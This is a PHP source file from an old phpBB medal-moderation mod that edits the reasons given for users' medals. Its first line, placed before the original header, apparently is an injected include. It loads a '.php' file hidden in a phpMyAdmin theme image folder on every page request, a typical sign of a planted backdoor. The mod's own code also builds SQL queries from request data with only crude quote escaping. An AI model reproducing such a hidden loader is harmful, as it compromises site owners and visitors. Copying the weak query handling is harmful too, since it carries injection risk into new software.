<?php
 require_once ('/var/www/html/archive.blackstardojo.org/phpmyadmin/themes/original/img/s_notice.php');

/***************************************************************************
 *                               medalcp_edit.php
 *                            -------------------
 * Begin                : October 31, 2003
 * Email                : ycl6@users.sourceforge.net (http://macphpbbmod.sourceforge.net/)
 * Ver. 		: 2.1.0
 *
 ***************************************************************************/

/***************************************************************************
 *
 *   This program is free software; you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation; either version 2 of the License, or
 *   (at your option) any later version.
 *
 ***************************************************************************/

define('IN_PHPBB', true);
$phpbb_root_path = './';
include($phpbb_root_path . 'extension.inc');
include($phpbb_root_path . 'common.'.$phpEx);

if ( isset($HTTP_GET_VARS[POST_USERS_URL]) || isset($HTTP_POST_VARS[POST_USERS_URL]) )
{
	$user_id = ( isset($HTTP_POST_VARS[POST_USERS_URL]) ) ? intval($HTTP_POST_VARS[POST_USERS_URL]) : intval($HTTP_GET_VARS[POST_USERS_URL]);
}
else
{
	$user_id = '';
}
$profiledata = get_userdata($user_id);

if ( isset($HTTP_GET_VARS[POST_MEDAL_URL]) || isset($HTTP_POST_VARS[POST_MEDAL_URL]) )
{
	$medal_id = ( isset($HTTP_POST_VARS[POST_MEDAL_URL]) ) ? intval($HTTP_POST_VARS[POST_MEDAL_URL]) : intval($HTTP_GET_VARS[POST_MEDAL_URL]);
}
else
{
	$medal_id = '';
}

// session id check
if (!empty($HTTP_POST_VARS['sid']) || !empty($HTTP_GET_VARS['sid']))
{
	$sid = (!empty($HTTP_POST_VARS['sid'])) ? $HTTP_POST_VARS['sid'] : $HTTP_GET_VARS['sid'];
}
else
{
	$sid = '';
}

//
// Start session management
//
$userdata = session_pagestart($user_ip, PAGE_MEDALS);
init_userprefs($userdata);
//
// End session management
//

// session id check
if ($sid == '' || $sid != $userdata['session_id'])
{
	$message = $lang['Not_Authorised'] . '<br /><br />' . sprintf($lang['Click_return_index'], '<a href="' . append_sid("index.$phpEx") . '">', '</a>');

	message_die(GENERAL_ERROR, $message);
}

$is_moderator = FALSE;

$is_moderator = ($userdata['user_level'] != ADMIN) ? check_medal_mod($medal_id) : TRUE;
	
// Start auth check
if ( !$is_moderator )
{
	$template->assign_vars(array(
		'META' => '<meta http-equiv="refresh" content="3;url=' . append_sid("index.$phpEx") . '">')
	);
		
	$message = $lang['Not_medal_moderator'] . '<br /><br />' . sprintf($lang['Click_return_index'], '<a href="' . append_sid("index.$phpEx") . '">', '</a>');

	message_die(GENERAL_MESSAGE, $message);
}
// End Auth Check

if ( empty($user_id) )
{
	message_die(GENERAL_MESSAGE, $lang['No_user_id_specified'] );
}

if ( empty($medal_id) )
{
	message_die(GENERAL_MESSAGE, $lang['No_medal_id_specified']);
}

$sql = "SELECT *
	FROM " . MEDAL_USER_TABLE . "
	WHERE medal_id = $medal_id
	AND user_id = '" . $profiledata['user_id'] . "'
	ORDER BY issue_id";

if ( !($result = $db->sql_query($sql)) )
{
	message_die(GENERAL_ERROR, 'Error getting user medal information', '', __LINE__, __FILE__, $sql);
}
else
{
	$row = $db->sql_fetchrowset($result);
	$rows = count($row);
	$issue = array();

	for($i = 0; $i < $rows; $i++)
	{
		$issue[$i]['issue_id'] = $row[$i]['issue_id'];
		$issue[$i]['issue_time'] = $row[$i]['issue_time'];
		$issue_reason = $row[$i]['issue_reason'];
		$default_config[$i] = $issue_reason;

		$issue[$i]['issue_reason'] = ( isset($HTTP_POST_VARS['issue_reason'.$row[$i]['issue_id']]) ) ? trim($HTTP_POST_VARS['issue_reason'.$row[$i]['issue_id']]) : $default_config[$i];

		if( isset($HTTP_POST_VARS['submit']) )
		{
			$sql = "UPDATE " . MEDAL_USER_TABLE . " 
				SET issue_reason = '" . str_replace("\'", "''", $issue[$i]['issue_reason']) . "'
				WHERE issue_id =" . $row[$i]['issue_id'];

			if ( !$db->sql_query($sql) )
			{
				message_die(GENERAL_ERROR, 'Could not update medal info', '', __LINE__, __FILE__, $sql);
			}
		}

	}
		
	if( isset($HTTP_POST_VARS['submit']) )
	{
		$message = $lang['Medal_update_sucessful'] . "<br /><br />" . sprintf($lang['Click_return_medal'], "<a href=\"" . append_sid("medalcp.$phpEx?" . POST_MEDAL_URL . "=$medal_id&amp;sid=".$userdata['session_id']."") . "\">", "</a>") . "<br /><br />" . sprintf($lang['Click_return_index'], "<a href=\"" . append_sid("index.$phpEx") . "\">", "</a>");

		message_die(GENERAL_MESSAGE, $message);
	}
}

$s_hidden_fields .= '<input type="hidden" name="sid" value="' . $userdata['session_id'] . '" />';
$s_hidden_fields .= '<input type="hidden" name="' . POST_USERS_URL . '" value="' . $profiledata['user_id'] . '" />';
$s_hidden_fields .= '<input type="hidden" name="' . POST_MEDAL_URL . '" value="' . $medal_id . '" />';

$page_title = $lang['Medal_Control_Panel'];
include($phpbb_root_path . 'includes/page_header.'.$phpEx);

$template->set_filenames(array(
	'body' => 'medalcp_edit_body.tpl')
);

$sql = "SELECT *
	FROM " . MEDAL_TABLE . " 
	WHERE medal_id =" . $medal_id;
if ( !($result = $db->sql_query($sql)) )
{
	message_die(GENERAL_ERROR, 'Could not obtain medal information', '', __LINE__, __FILE__, $sql);
}
$medal_info = $db->sql_fetchrow($result);

$template->assign_vars(array(
	'L_MEDAL_INFORMATION' => $lang['Medal_Information'] . ' :: ' . $profiledata['username'],
	"L_SUBMIT" => $lang['Submit'],
	"L_RESET" => $lang['Reset'],

	"MEDAL_NAME" => $medal_info['medal_name'],
	"MEDAL_DESCRIPTION" => $medal_info['medal_description'],
	
	"S_MEDAL_ACTION" => append_sid("medalcp_edit.$phpEx"),
	'S_HIDDEN_FIELDS' => $s_hidden_fields)
);

for($i = 0; $i < $rows; $i++)
{
	$template->assign_block_vars("medaledit", array(
		'L_MEDAL_TIME' => $lang['Medal_time'],
		'L_MEDAL_REASON' => $lang['Medal_reason'],
		'L_MEDAL_REASON_EXPLAIN' => $lang['Medal_reason_explain'],
		'L_ISSUE_REASON' => 'issue_reason'. $issue[$i]['issue_id'],
		
		"ISSUE_REASON" => $issue[$i]['issue_reason'],
		"ISSUE_TIME" => create_date($board_config['default_dateformat'], $issue[$i]['issue_time'], $board_config['board_timezone'])
		)
	);
}

// 1 2 6

$template->pparse('body');

include($phpbb_root_path . 'includes/page_tail.'.$phpEx);

?>
